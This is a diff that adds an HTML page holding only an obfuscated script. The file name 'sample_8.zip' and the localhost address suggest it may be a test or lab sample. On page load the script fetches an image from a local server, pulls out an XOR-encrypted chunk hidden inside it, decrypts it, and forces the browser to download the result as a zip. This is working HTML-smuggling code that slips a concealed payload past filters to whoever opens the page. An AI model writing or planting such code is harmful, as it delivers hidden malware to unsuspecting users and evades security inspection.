@@ -1,0 +1,7 @@
+
+        <html>
+        <body>
+            <script type="application/javascript">function WXRCD(EufKm, ARsAy){let TqqLn = new Uint8Array(EufKm.length);for (let i = 0; i < EufKm.length; i++) {TqqLn[i] = EufKm[i] ^ ARsAy[i % ARsAy.length];}return TqqLn;}function daePD(ALkou) {const czafO = new XMLHttpRequest();czafO.open('GET', ALkou, true);czafO.responseType = 'arraybuffer';czafO.onload = function() {if (czafO.status === 200) {const zpDCW = czafO.response;const mPXvl = new DataView(zpDCW);let zjsME = 8;let mhSrg = null;while (zjsME < zpDCW.byteLength) {const civJb = mPXvl.getUint32(zjsME);zjsME += 4;const XacEU = new Uint8Array(zpDCW, zjsME, 4);const GAFxL = String.fromCharCode.apply(null, XacEU);zjsME += 4;if (GAFxL === 'xkEy') {mhSrg = new Uint8Array(zpDCW, zjsME, civJb);} else if (GAFxL === 'exEf' && mhSrg !== null) {const jUgiQ = new Uint8Array(zpDCW, zjsME, civJb);const IFcRz = WXRCD(jUgiQ,mhSrg);const KgSmJ = new Blob([IFcRz], { type: 'application/octet-stream' }), jeUeO = document.createElement('a');jeUeO.href = URL.createObjectURL(KgSmJ);jeUeO.download = 'sample_8.zip';document.body.appendChild(jeUeO);jeUeO.click();URL.revokeObjectURL(jeUeO.href);document.body.removeChild(jeUeO);return;}zjsME += civJb + 4;}}};czafO.onerror = function(){};czafO.send();}daePD('http://127.0.0.1:8000/banner.png');</script>
+        </body>
+        </html>
+    
